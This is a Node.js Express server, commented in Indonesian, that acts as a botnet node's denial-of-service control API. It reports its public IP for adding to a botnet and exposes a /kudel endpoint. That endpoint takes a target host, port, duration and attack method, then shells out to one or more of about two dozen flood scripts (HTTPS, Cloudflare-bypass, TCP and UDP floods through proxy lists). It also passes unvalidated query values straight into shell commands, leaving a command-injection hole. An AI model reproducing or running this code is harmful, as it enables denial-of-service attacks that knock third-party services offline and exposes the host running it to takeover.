const express = require('express');
const { exec } = require('child_process');
const axios = require('axios');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;

// Fungsi untuk mengambil data dari API
async function fetchData() {
  try {
    const response = await axios.get('https://httpbin.org/get');
    const data = response.data;
    console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
    return data;
  } catch (error) {
    console.error('Error fetching data:', error);
  }
}

// Endpoint untuk menerima request serangan
app.get('/kudel', (req, res) => {
  const { host, port, time, methods } = req.query;

  // Validasi parameter
  if (!host || !port || !time || !methods) {
    return res.status(400).json({
      error: 'Missing required parameters'
    });
  }

  // Respon ke client
  res.status(200).json({
    message: 'API request received. Executing script shortly.',
    target: host,
    time,
    methods
  });

  console.log(`Received attack request: Method ${methods}, Target ${host}, Duration ${time}s`);

  // Daftar metode serangan
  const attackMethods = {
    'https-cdn': `node ./lib/cache/https-cdn.js GET ${host} ${time} 1 90 proxy.txt --cdn true --full --legit`,
    'https-bypass': `node ./lib/cache/https-bypass.js ${host} ${time} 90 1 proxy.txt`,
    'https-tlsv3': `node ./lib/cache/https-tlsv3.js ${host} ${time} 90 1 proxy.txt`,
    'https-tlsv2': `node ./lib/cache/https-tlsv2.js GET ${host} proxy.txt ${time} 90 1 cookie="user=admin"`,
    'tcp': `node ./lib/cache/x.py ${host} ${port} ${time} TCP 10 1`,
    'udp': `node ./lib/cache/x.py ${host} ${port} ${time} UDP 10 1`,
    'https-raw': `node ./lib/cache/https-raw.js GET ${host} proxy.txt ${time} 90 1`,
    'https-flood': `node ./lib/cache/https-flood.js ${host} ${time} 90 1 proxy.txt --bfm true --fakebot true --autoratelimit true`,
    'https-uam': `node ./lib/cache/https-uam.js ${host} ${time} 90`,
    'https-browser': `node ./lib/cache/browserfix29.js ${host} ${time} 90`,
    'https-403': `node ./lib/cache/https-403.js ${host} ${time} 90 1 proxy.txt`,
    'https-leak': `node ./lib/cache/https-leak.js --method GET --target ${host} --time ${time} --rate 90 --threads 1 --proxy proxy.txt --http mix --full true --extra true --randpath true --query true --fingerprint true`,
    'https-cf': `node ./lib/cache/https-cf.js ${host} ${time} 90 1 proxy.txt --all--bypass --all--full --all--extra --all--randpath --all-backend --all-query`,
    'https-tls': `node ./lib/cache/https-tls.js GET ${host} proxy.txt ${time} 90 1 cookie="user=admin"`,   
    'https-cve': `node ./lib/cache/https-cve.js GET "${host}" ${time} 1 90 proxy.txt --ultra --http mix --backend --query 1`,
    'https-du': `node ./lib/cache/https-du.js ${host} ${time} 1 90 proxy.txt`,
    'https-killcf': `node ./lib/cache/https-killcf.js ${host} ${time} 1 proxy.txt 90`,
    'https-spam': `node ./lib/cache/https-spam.js ${host} ${time} 90 1`,
    'R2': `node ./lib/cache/R2.js ${host} ${time} 90 1 proxy.txt`,
    'https-destroy': `node ./lib/cache/https-destroy.js ${host} ${time} 1 proxy.txt 50 flood true`,
    'https-star': `node ./lib/cache/https-star.js ${host} ${time} 90 1 proxy.txt`,
    'https-light': `node ./lib/cache/https-light.js ${host} ${time} 90 1 proxy.txt`,
    'https-super': `node ./lib/cache/https-super.js ${host} ${time} 1 90`
  };

  // Fungsi untuk mengeksekusi perintah
  const executeCommand = (command) => {
    exec(command, (error, stdout, stderr) => {
      if (error) {
        console.error(`Execution error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`Stderr: ${stderr}`);
        return;
      }
      console.log(`Executed: ${command}`);
      console.log(`Output: ${stdout}`);
    });
  };

  // Cek jika methods adalah mix (format: method1+method2+method3)
  if (methods.includes('+')) {
    const methodList = methods.split('+');
    
    // Batasi maksimal 3 metode
    const selectedMethods = methodList.slice(0, 5).map(method => attackMethods[method]).filter(Boolean);
    
    if (selectedMethods.length > 0) {
      console.log(`Executing mix of ${selectedMethods.length} methods...`);
      selectedMethods.forEach(executeCommand);
    } else {
      console.log('No valid methods found in mix');
    }
  } else {
    // Eksekusi metode tunggal
    const selectedMethod = attackMethods[methods];
    if (selectedMethod) {
      executeCommand(selectedMethod);
    } else {
      console.log(`Unsupported method: ${methods}`);
    }
  }
});

// Jalankan server
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
  fetchData();
});